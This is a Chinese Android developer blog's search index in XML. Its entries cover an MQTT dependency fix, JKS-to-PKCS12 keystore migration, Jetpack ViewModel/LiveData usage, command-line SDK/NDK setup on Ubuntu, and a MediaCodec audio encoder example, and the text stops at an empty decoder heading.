<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>空白主题</title>
    <url>/%E7%A9%BA%E7%99%BD/</url>
    <content><![CDATA[<p><img src="/images/目录/test.png" alt></p>
]]></content>
  </entry>
  <entry>
    <title>Android Eclipse MQTT避坑</title>
    <url>/Android/Android%20Eclipse%20MQTT%E9%81%BF%E5%9D%91/</url>
    <content><![CDATA[<p>现在兼容库主流都是使用了<code>androidx</code>，在使用 <code>org.eclipse.paho:org.eclipse.paho.android.service:1.1.1</code>发现依赖的<code>LocalBroadcastManager</code>是v4的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.NoClassDefFoundError: Failed resolution of: Landroid/support/v4/content/LocalBroadcastManager;</span><br><span class="line">at org.eclipse.paho.android.service.MqttAndroidClient.registerReceiver(MqttAndroidClient.java:450)</span><br></pre></td></tr></table></figure>
<p>这个坑位避开有两个方法:</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在 <code>gradle.properties</code> 加入 <code>android.enableJetifier=true</code> 重新编译就可以。</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果上面的方法影响到你的项目，还有一个方法，加入一个新的依赖<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation &apos;androidx.localbroadcastmanager:localbroadcastmanager:1.0.0&apos;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>解决方法来自：<a href="https://github.com/eclipse/paho.mqtt.android/issues/321" target="_blank" rel="noopener">【#321】</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title>Android JKS证书升级</title>
    <url>/Android/Android%20JKS%E8%AF%81%E4%B9%A6%E5%8D%87%E7%BA%A7/</url>
    <content><![CDATA[<p>用Android Studio 3.5创建了JKS证书，提示以下警告：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JKS 密钥库使用专用格式。建议使用 &quot;keytool -importkeystore -srckeystore D:\demo\project\app\key.jks -destkeystore D:\demo\project\app\key.jks -deststoretype pkcs12&quot; 迁移到行业标准格式 PKCS12。</span><br></pre></td></tr></table></figure>
<p>按照上面的提示，执行命令:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ keytool -importkeystore -srckeystore D:\\demo\\project\\app\\key.jks -destkeystore D:\\demo\\project\\app\\key.jks -deststoretype pkcs12</span><br><span class="line"></span><br><span class="line">输入源密钥库口令:</span><br><span class="line">已成功导入别名 myapp 的条目。</span><br><span class="line">已完成导入命令: 1 个条目成功导入, 0 个条目失败或取消</span><br><span class="line">Warning:</span><br><span class="line">已将 <span class="string">"D:\demo\project\app\key.jks"</span> 迁移到 Non JKS/JCEKS。将 JKS 密钥库作为 <span class="string">"D:\demo\project\app\key.j</span></span><br><span class="line"><span class="string">ks.old"</span> 进行了备份。</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>jks</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Jetpack架构组件</title>
    <url>/Android/Android%20Jetpack%E6%9E%B6%E6%9E%84%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<p><a href="https://developer.android.google.cn/jetpack/getting-started" target="_blank" rel="noopener">【Android Jetpack 使用入门】</a><br><a href="https://developer.android.google.cn/topic/libraries/architecture" target="_blank" rel="noopener">【Android 架构组件   Android Jetpack 的一部分。】</a></p>
<p>Android 架构组件是一组库，可帮助您设计稳健、可测试且易维护的应用。您可以从管理界面组件生命周期和处理数据持久性的类着手。</p>
<ul>
<li>通过应用架构指南，学习有关汇编稳健应用的基础知识。</li>
<li>管理应用的生命周期。新的生命周期感知型组件可帮助您管理 Activity 和 Fragment 的生命周期。在配置更改后继续有效、避免内存泄漏，以及将数据轻松加载到界面中。</li>
<li>使用 LiveData 构建数据对象，在基础数据库改变时通知视图。</li>
<li>ViewModel 存储界面相关的数据，这些数据不会在应用旋转时销毁。</li>
<li>Room 是一个 SQLite 对象映射库。它可用来避免样板代码，还可以轻松地将 SQLite 表数据转换为 Java 对象。Room 提供 SQLite 语句的编译时检查，并且可以返回 RxJava、Flowable 和 LiveData 可观察对象。</li>
</ul>
<p><strong> Jetpack有很多部分，这里先整理一下最常用的两个：<code>ViewModel</code> 和 <code>LiveData</code> </strong></p>
<h2 id="一、ViewModel"><a href="#一、ViewModel" class="headerlink" title="一、ViewModel"></a>一、ViewModel</h2><p><a href="https://developer.android.google.cn/topic/libraries/architecture/viewmodel" target="_blank" rel="noopener">【ViewModel 概览】</a></p>
<p>ViewModel 以注重<code>生命周期</code>的方式存储和管理界面相关的数据，比如让数据可在屏幕旋转等配置更改后继续留存。<br>类似在 <code>onSaveInstanceState()</code> 处理数据的保存和恢复。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> androidx.lifecycle.ViewModel</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestViewModel</span> : <span class="type">ViewModel</span></span>() &#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> myViewModel: MyViewModel</span><br><span class="line"></span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">    setContentView(R.layout.activity_main)</span><br><span class="line"></span><br><span class="line">    myViewModel = ViewModelProvider(<span class="keyword">this</span>).<span class="keyword">get</span>(MyViewModel::<span class="class"><span class="keyword">class</span>.<span class="title">java</span>)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//直接赋值或者取值</span></span><br><span class="line">	myViewModel.num++</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这样 <code>num</code> 变量就能在屏幕旋转时自动保存和恢复，单独使用<code>ViewModel</code>感觉没多大优势，如何配合<code>LiveData</code>将更加方便。</p>
<p><strong> Fragment KTX </strong></p>
<p>引入<a href="https://developer.android.google.cn/kotlin/ktx#fragment" target="_blank" rel="noopener"><code>fragment-ktx</code></a>这个扩展库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation &quot;androidx.fragment:fragment-ktx:1.3.3&quot;</span><br></pre></td></tr></table></figure></p>
<p>可以更加简洁的创建ViewModel</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// Get a reference to the ViewModel scoped to this Fragment</span><br><span class="line">val viewModel by viewModels&lt;MyViewModel&gt;()</span><br><span class="line"></span><br><span class="line">// Get a reference to the ViewModel scoped to its Activity</span><br><span class="line">val viewModel by activityViewModels&lt;MyViewModel&gt;()</span><br></pre></td></tr></table></figure>
<h2 id="二、LiveData"><a href="#二、LiveData" class="headerlink" title="二、LiveData"></a>二、LiveData</h2><p><a href="https://developer.android.google.cn/topic/libraries/architecture/livedata" target="_blank" rel="noopener">【LiveData 概览】</a></p>
<p>LiveData 具有生命周期感知能力观察类，遵循其他应用组件（如 Activity、Fragment 或 Service）的生命周期。这种感知能力可确保 LiveData 仅更新处于活跃生命周期状态的应用组件观察者。</p>
<p><strong>使用 LiveData 的优势:</strong></p>
<ul>
<li>确保界面符合数据状态</li>
<li>不会发生内存泄漏</li>
<li>不会因 Activity 停止而导致崩溃</li>
<li>不再需要手动处理生命周期</li>
<li>数据始终保持最新状态</li>
<li>适当的配置更改</li>
<li>共享资源</li>
</ul>
<p>请按照以下步骤使用 LiveData 对象：</p>
<ol>
<li>创建 LiveData 的实例以存储某种类型的数据。这通常在 ViewModel 类中完成。</li>
<li>创建可定义 onChanged() 方法的 Observer 对象，该方法可以控制当 LiveData 对象存储的数据更改时会发生什么。通常情况下，您可以在界面控制器（如 Activity 或 Fragment）中创建 Observer 对象。</li>
<li>使用 observe() 方法将 Observer 对象附加到 LiveData 对象。observe() 方法会采用 LifecycleOwner 对象。这样会使 Observer 对象订阅 LiveData 对象，以使其收到有关更改的通知。通常情况下，您可以在界面控制器（如 Activity 或 Fragment）中附加 Observer 对象。</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameViewModel</span> : <span class="type">ViewModel</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a LiveData with a String</span></span><br><span class="line">    <span class="keyword">val</span> currentName: MutableLiveData&lt;String&gt; <span class="keyword">by</span> lazy &#123;</span><br><span class="line">        MutableLiveData&lt;String&gt;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Rest of the ViewModel...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameActivity</span> : <span class="type">AppCompatActivity</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> model: NameViewModel <span class="keyword">by</span> viewModels()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建观察者实例，用于更新UI</span></span><br><span class="line">        <span class="keyword">val</span> nameObserver = Observer&lt;String&gt; &#123; newName -&gt;</span><br><span class="line"></span><br><span class="line">            nameTextView.text = newName</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 观察 LiveData</span></span><br><span class="line">        model.currentName.observe(<span class="keyword">this</span>, nameObserver)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更新LiveData数据， <code>model.currentName.setValue()</code> 或 <code>model.currentName.postValue()</code> 来更新 Name的值，Observer会被回调更新UI。</p>
<h2 id="附加：Android-KTX"><a href="#附加：Android-KTX" class="headerlink" title="附加：Android KTX"></a>附加：Android KTX</h2><p><a href="https://developer.android.google.cn/kotlin/ktx" target="_blank" rel="noopener">【Android KTX】</a> 是包含在 Android Jetpack 及其他 Android 库中的一组 Kotlin 扩展程序。KTX 扩展程序可以为 Jetpack、Android 平台及其他 API 提供简洁的惯用 Kotlin 代码。为此，这些扩展程序利用了多种 Kotlin 语言功能，其中包括：</p>
<ul>
<li>扩展函数</li>
<li>扩展属性</li>
<li>Lambda</li>
<li>命名参数</li>
<li>参数默认值</li>
<li>协程</li>
</ul>
<h4 id="Fragment-KTX"><a href="#Fragment-KTX" class="headerlink" title="Fragment KTX"></a>Fragment KTX</h4><ol>
<li><p>Fragment KTX 模块提供了一系列扩展程序以简化 Fragment API。<br>借助 Fragment KTX 模块，可以使用 lambda 来简化 Fragment 事务，例如：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">fragmentManager().commit &#123;</span><br><span class="line">   addToBackStack(<span class="string">"..."</span>)</span><br><span class="line">   setCustomAnimations(</span><br><span class="line">           R.anim.enter_anim,</span><br><span class="line">           R.anim.exit_anim)</span><br><span class="line">   add(fragment, <span class="string">"..."</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>还可以使用 viewModels 和 activityViewModels 属性委托在一行中绑定到 ViewModel：<br>【省略，往上翻，上面有】</p>
</li>
</ol>
<h4 id="Lifecycle-KTX"><a href="#Lifecycle-KTX" class="headerlink" title="Lifecycle KTX"></a>Lifecycle KTX</h4><p>Lifecycle KTX 为每个 Lifecycle 对象定义一个 LifecycleScope。在此范围内启动的协程会在 Lifecycle 被销毁时取消。您可以使用 lifecycle.coroutineScope 或 lifecycleOwner.lifecycleScope 属性访问 Lifecycle 的 CoroutineScope。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation &quot;androidx.lifecycle:lifecycle-runtime-ktx:2.3.1&quot;</span><br></pre></td></tr></table></figure>
<p>以下示例演示了如何使用 lifecycleOwner.lifecycleScope 异步创建预计算文本：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFragment</span>: <span class="type">Fragment</span></span>() &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onViewCreated</span><span class="params">(view: <span class="type">View</span>, savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onViewCreated(view, savedInstanceState)</span><br><span class="line">        viewLifecycleOwner.lifecycleScope.launch &#123;</span><br><span class="line">            <span class="keyword">val</span> params = TextViewCompat.getTextMetricsParams(textView)</span><br><span class="line">            <span class="keyword">val</span> precomputedText = withContext(Dispatchers.Default) &#123;</span><br><span class="line">                PrecomputedTextCompat.create(longTextContent, params)</span><br><span class="line">            &#125;</span><br><span class="line">            TextViewCompat.setPrecomputedText(textView, precomputedText)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="ViewModel-KTX"><a href="#ViewModel-KTX" class="headerlink" title="ViewModel KTX"></a>ViewModel KTX</h4><p>ViewModel KTX 库提供了一个 viewModelScope() 函数，可让您更轻松地从 ViewModel 启动协程。CoroutineScope 绑定至 Dispatchers.Main，并且会在清除 ViewModel 后自动取消。您可以使用 viewModelScope()，而无需为每个 ViewModel 创建一个新范围。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lifecycle_version = &quot;2.3.1&quot;</span><br><span class="line">// ViewModel</span><br><span class="line">implementation &quot;androidx.lifecycle:lifecycle-viewmodel-ktx:$lifecycle_version&quot;</span><br></pre></td></tr></table></figure></p>
<h4 id="LiveData-KTX"><a href="#LiveData-KTX" class="headerlink" title="LiveData KTX"></a>LiveData KTX</h4><p>使用 LiveData 时，您可能需要异步计算值。例如，您可能需要检索用户的偏好设置并将其传送给界面。在这些情况下，LiveData KTX 可提供一个 liveData 构建器函数，该函数会调用 suspend 函数，并将结果作为 LiveData 对象传送。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lifecycle_version = &quot;2.3.1&quot;</span><br><span class="line">// LiveData</span><br><span class="line">implementation &quot;androidx.lifecycle:lifecycle-livedata-ktx:$lifecycle_version&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>jetpack</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Linux命令行环境变量配置</title>
    <url>/Android/Android%20Linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>Ubuntu下安装配置Android命令行编译环境，用于Jenkins编译项目和NDK编译第三方so库。</p>
<h2 id="安装命令行工具sdkmanager"><a href="#安装命令行工具sdkmanager" class="headerlink" title="安装命令行工具sdkmanager"></a>安装命令行工具sdkmanager</h2><ol>
<li><a href="https://developer.android.google.cn/studio#downloads" target="_blank" rel="noopener">【在下载页面】</a> 下载<br><a href="https://dl.google.com/android/repository/commandlinetools-linux-6858069_latest.zip" target="_blank" rel="noopener">【commandlinetools-linux】</a> 至路径 <code>/usr/local/androidsdk</code> </li>
<li>解压到当前目录，命令行工具的目录是 <code>cmdline-tools</code> </li>
<li>sdkmanager是可执行文件</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> cmdline-tools/</span><br><span class="line">$ ls</span><br><span class="line">bin  lib  NOTICE.txt  source.properties</span><br><span class="line">$ tree bin</span><br><span class="line">bin</span><br><span class="line">├── apkanalyzer</span><br><span class="line">├── avdmanager</span><br><span class="line">├── lint</span><br><span class="line">├── screenshot2</span><br><span class="line">└── sdkmanager</span><br><span class="line"></span><br><span class="line">0 directories, 5 files</span><br></pre></td></tr></table></figure>
<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>设置全局环境变量 <code>vim /etc/profile</code> ，（如果只设置当前帐号，编辑 <code>vim ~/.bashrc</code> ）。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#java</span></span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk1.8</span><br><span class="line">JRE_HOME=<span class="variable">$JAVA_HOME</span>/jre</span><br><span class="line">JAVA_BIN=<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line">CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar:<span class="variable">$JRE_HOME</span>/lib</span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$JRE_HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME JRE_HOME PATH CLASSPATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#android sdk</span></span><br><span class="line"><span class="built_in">export</span> ANDROID_HOME=/usr/<span class="built_in">local</span>/androidsdk</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$ANDROID_HOME</span>/tools/bin:<span class="variable">$ANDROID_HOME</span>/platform-tools:<span class="variable">$ANDROID_HOME</span>/cmdline-tools/bin</span><br><span class="line"></span><br><span class="line"><span class="comment">#android ndk</span></span><br><span class="line"><span class="built_in">export</span> ANDROID_NDK=<span class="variable">$ANDROID_HOME</span>/ndk/21.3.6528147</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;ANDROID_NDK&#125;</span>:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<p>使环境变量立刻生效<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ source ~/.bashrc</span><br></pre></td></tr></table></figure></p>
<h2 id="安装sdk"><a href="#安装sdk" class="headerlink" title="安装sdk"></a>安装sdk</h2><blockquote>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sdkmanager --list --sdk_root=/usr/<span class="built_in">local</span>/androidsdk</span><br><span class="line">Error: Could not determine SDK root. </span><br><span class="line">Error: Either specify it explicitly with --sdk_root= or move this package into its expected location: \cmdline-tools\latest\</span><br><span class="line"><span class="comment"># 这个错误是由于我们还没有安装sdk，执行sdkmanager时要指定一下我们的sdk路径，相当于指定它下载文件的路径</span></span><br><span class="line">$</span><br><span class="line">$</span><br><span class="line"><span class="comment"># 查看现在的build-tools版本有哪些</span></span><br><span class="line">$ sdkmanager --list --sdk_root=/usr/<span class="built_in">local</span>/androidsdk |grep build-tools </span><br><span class="line"><span class="comment"># 选择一个合适的版本，安装</span></span><br><span class="line">$ sdkmanager --install <span class="string">"build-tools;30.0.3"</span> --sdk_root=/usr/<span class="built_in">local</span>/androidsdk</span><br><span class="line"><span class="comment"># 安装平台工具</span></span><br><span class="line">$ sdkmanager --install <span class="string">"platform-tools"</span> --sdk_root=/usr/<span class="built_in">local</span>/androidsdk</span><br><span class="line"><span class="comment"># 这时候就不用指定sdk的路径了</span></span><br><span class="line">$ sdkmanager --list</span><br><span class="line"><span class="comment"># 安装Android-30</span></span><br><span class="line">$ sdkmanager --install <span class="string">"platforms;android-30"</span></span><br></pre></td></tr></table></figure>
<h2 id="附：sdkmanager-安装NDK"><a href="#附：sdkmanager-安装NDK" class="headerlink" title="附：sdkmanager 安装NDK"></a>附：sdkmanager 安装NDK</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sdkmanager --list |grep cmake </span><br><span class="line"><span class="comment"># 选择一个版本，或者最新版本</span></span><br><span class="line">$ sdkmanager --install <span class="string">"cmake;3.10.2.4988404"</span></span><br><span class="line"></span><br><span class="line">$ sdkmanager --list |grep ndk </span><br><span class="line"><span class="comment"># 选择一个版本，或者最新版本</span></span><br><span class="line">$ sdkmanager --install <span class="string">"ndk;21.3.6528147"</span></span><br></pre></td></tr></table></figure>
<p><a href="https://developer.android.google.cn/studio/command-line/sdkmanager" target="_blank" rel="noopener">【sdkmanager用户指南 】</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>jks</tag>
      </tags>
  </entry>
  <entry>
    <title>Android MediaCodec硬编解码器</title>
    <url>/Android/Android%20MediaCodec%E7%A1%AC%E7%BC%96%E8%A7%A3%E7%A0%81%E5%99%A8/</url>
    <content><![CDATA[<p>Android 的 <a href="https://developer.android.google.cn/reference/android/media/MediaCodec?hl=en" target="_blank" rel="noopener">MediaCodec</a> 可以编/解码音频视频，支持同步和异步两种使用方式。</p>
<h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p>参考官网的文档<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MediaCodec codec = MediaCodec.createByCodecName(name);</span><br><span class="line"> MediaFormat mOutputFormat; <span class="comment">// member variable</span></span><br><span class="line"> codec.setCallback(<span class="keyword">new</span> MediaCodec.Callback() &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">onInputBufferAvailable</span><span class="params">(MediaCodec mc, <span class="keyword">int</span> inputBufferId)</span> </span>&#123;</span><br><span class="line">    ByteBuffer inputBuffer = codec.getInputBuffer(inputBufferId);</span><br><span class="line">    <span class="comment">// fill inputBuffer with valid data</span></span><br><span class="line">    …</span><br><span class="line">    codec.queueInputBuffer(inputBufferId, …);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">onOutputBufferAvailable</span><span class="params">(MediaCodec mc, <span class="keyword">int</span> outputBufferId, …)</span> </span>&#123;</span><br><span class="line">    ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId);</span><br><span class="line">    MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); <span class="comment">// option A</span></span><br><span class="line">    <span class="comment">// bufferFormat is equivalent to mOutputFormat</span></span><br><span class="line">    <span class="comment">// outputBuffer is ready to be processed or rendered.</span></span><br><span class="line">    …</span><br><span class="line">    codec.releaseOutputBuffer(outputBufferId, …);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">onOutputFormatChanged</span><span class="params">(MediaCodec mc, MediaFormat format)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Subsequent data will conform to new format.</span></span><br><span class="line">    <span class="comment">// Can ignore if using getOutputFormat(outputBufferId)</span></span><br><span class="line">    mOutputFormat = format; <span class="comment">// option B</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">onError</span><span class="params">(…)</span> </span>&#123;</span><br><span class="line">    …</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> codec.configure(format, …);</span><br><span class="line"> mOutputFormat = codec.getOutputFormat(); <span class="comment">// option B</span></span><br><span class="line"> codec.start();</span><br><span class="line"> <span class="comment">// wait for processing to complete</span></span><br><span class="line"> codec.stop();</span><br><span class="line"> codec.release();</span><br></pre></td></tr></table></figure></p>
<p>音频和视频的用法差不多，差异在于配置上，编码和解码也是。</p>
<p>两个不同的函数 <code>MediaCodec.createDecoderByType(..)</code> 为 <code>MediaCodec.createEncoderByType(..)</code> 创建 <code>MediaCodec</code> 。</p>
<ol>
<li>实现一个异步音频的编码器</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mime MediaFormat.MIMETYPE_AUDIO_*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">createMediaCodecEncoder</span><span class="params">(mime: <span class="type">String</span>, sampleRate:<span class="type">Int</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> format = MediaFormat.createAudioFormat(mime,sampleRate,<span class="number">1</span>)</span><br><span class="line">    format.setInteger(MediaFormat.KEY_CHANNEL_MASK, AudioFormat.CHANNEL_IN_MONO);</span><br><span class="line">    format.setInteger(MediaFormat.KEY_BIT_RATE, <span class="number">128000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> mMediaCodec = MediaCodec.createEncoderByType(mime)</span><br><span class="line">    mMediaCodec.configure(format, <span class="literal">null</span>, <span class="literal">null</span>, MediaCodec.CONFIGURE_FLAG_ENCODE)</span><br><span class="line"></span><br><span class="line">    mMediaCodec.setCallback(<span class="keyword">object</span> :MediaCodec.Callback()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输入缓冲区可用时回调此函数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onInputBufferAvailable</span><span class="params">(codec: <span class="type">MediaCodec</span>, index: <span class="type">Int</span>)</span></span> &#123;</span><br><span class="line">            <span class="comment">//TODO 这里输入数据</span></span><br><span class="line">            <span class="keyword">val</span> dataLength = <span class="number">2</span></span><br><span class="line">            <span class="keyword">val</span> <span class="keyword">data</span> = ByteArray(dataLength)<span class="comment">//TODO 假设这是一帧PCM数据，作为输入编码器的数据</span></span><br><span class="line">            <span class="keyword">val</span> inputBuffer = codec.getInputBuffer(index)</span><br><span class="line">            <span class="keyword">if</span>(inputBuffer != <span class="literal">null</span>)&#123;</span><br><span class="line">                inputBuffer.clear()</span><br><span class="line">                inputBuffer.put(<span class="keyword">data</span>)</span><br><span class="line">                codec.queueInputBuffer(index,<span class="number">0</span>,dataLength,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                codec.queueInputBuffer(index,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输出编码数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onOutputBufferAvailable</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            codec: <span class="type">MediaCodec</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            index: <span class="type">Int</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            info: <span class="type">MediaCodec</span>.<span class="type">BufferInfo</span> )</span></span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(info.size &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((info.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != <span class="number">0</span>) &#123;</span><br><span class="line">                        println(<span class="string">"编码器输出配置信息"</span>)</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        println(<span class="string">"编码器输出编码数据"</span>)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">val</span> outputBuffer = codec.getOutputBuffer(index)<span class="comment">//取出数据</span></span><br><span class="line">                    <span class="keyword">val</span> outputData = ByteArray(info.size)</span><br><span class="line">                    outputBuffer?.<span class="keyword">get</span>(outputData)</span><br><span class="line">                    <span class="comment">//TODO outputData 是编码后数据</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (e:Exception)&#123;</span><br><span class="line">                e.printStackTrace()</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                codec.releaseOutputBuffer(index, <span class="literal">false</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onError</span><span class="params">(codec: <span class="type">MediaCodec</span>, e: <span class="type">MediaCodec</span>.<span class="type">CodecException</span>)</span></span> &#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onOutputFormatChanged</span><span class="params">(codec: <span class="type">MediaCodec</span>, format: <span class="type">MediaFormat</span>)</span></span> &#123;</span><br><span class="line">            println(<span class="string">"onOutputFormatChanged"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    mMediaCodec.start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>实现一个异步音频的解码器</li>
</ol>
